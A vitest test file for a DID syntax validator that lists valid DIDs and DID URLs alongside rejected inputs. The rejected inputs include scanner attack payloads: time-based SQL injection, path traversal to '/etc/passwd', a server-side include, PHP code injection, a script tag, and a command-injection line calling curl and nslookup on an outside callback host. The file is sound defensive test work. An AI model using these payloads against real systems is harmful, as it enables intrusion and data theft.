import { describe, expect, it } from "vitest";
import { didMethod, isDidOrDidUrl } from "./did-syntax";

// Shapes that resolve in production (sampled from the analytics log) plus the
// DID Core §3.2 DID URL forms.
const VALID = [
  "did:web:example.com",
  "did:web:example.com%3A3000",
  "did:web:example.com:user:alice",
  "did:key:z6MkhaXgBZDvotDkL5257faiztiGiC2QtKLGpbnnEGta2doK",
  "did:jwk:eyJjcnYiOiJQLTI1NiIsImt0eSI6IkVDIiwieCI6ImFjYklRaXVNczNpOF91c3pFakoydHBUdFJNNEVVM3l6OTFQSDZDZEgyVjAifQ",
  "did:pkh:eip155:1:0xb9c5714089478a327f09197987f16f9e5d936e8a",
  "did:peer:2.Ez6LSbysY2xFMRpGMhb7tFTLMpeuPRaqaWM1yECxGKdNsvWuM.Vz6MkqRYqQiSgvZQdnBytw86Qbs2ZWUkGv22od935YF4s8M7V",
  "did:cheqd:mainnet:Ps1ysXP2Ae6GBfxNhNQNKN",
  "did:plc:ewvi7nxzyoun6zhxrhs64oiz",
  "did:iden3:polygon:amoy:x6x5sor7zpyZX9yNpm8h1rPBDSN9idaEhDj1Ybm8B",
  "did:webvh:QmScid:example.com?versionId=1-QmHash",
  "did:example:123#key-1",
  "did:example:123/path/to?service=files&relativeRef=%2Fa#frag",
  "did:0:x",
];

// Payloads from the 2026-09 scanner burst in the analytics log, plus edges.
const INVALID = [
  "",
  "4111111111111111",
  "4111111111111111xo2aSLG1'; waitfor delay '0:0:15' -- ",
  "file:///etc/passwd",
  "c:/windows/win.ini",
  "..\\..\\..\\..\\windows/win.ini",
  "http://bxss.me/t/fit.txt?.jpg",
  "HttP://bxss.me/t/xss.html?%00",
  "DID: 063dfb6ec08428e99504fe76b2d8c78a MCID: 2D0AA6285E68C9B3",
  '<!--#include src="http://bxss.me/t/fit.txt"-->',
  "(select(0)from(select(sleep(15)))v)",
  "|(nslookup -q=cname hitjjbhxrhzwh669d3.bxss.me||curl hitjjbhxrhzwh669d3.bxss.me)",
  "${@print(md5(31337))}",
  " crlaw9qz",
  "did:WEB:example.com", // method-name is lowercase
  "did:web:", // empty method-specific-id
  "did::example",
  "did:web:exa mple.com",
  "did:web:example.com;service=files", // matrix parameters are not DID URL syntax
  "did:web:example.com?q=<script>",
  "did:web:%zz",
  "did:web:example.com#a#b",
];

describe("DID Core §3.1/§3.2 syntax gate", () => {
  it("accepts DIDs and DID URLs", () => {
    for (const did of VALID) expect(isDidOrDidUrl(did), did).toBe(true);
    expect(didMethod("did:webvh:QmScid:example.com?versionId=1-x")).toBe(
      "webvh",
    );
  });

  it("refuses everything else", () => {
    for (const input of INVALID) {
      expect(isDidOrDidUrl(input), input).toBe(false);
      expect(didMethod(input), input).toBeNull();
    }
  });
});
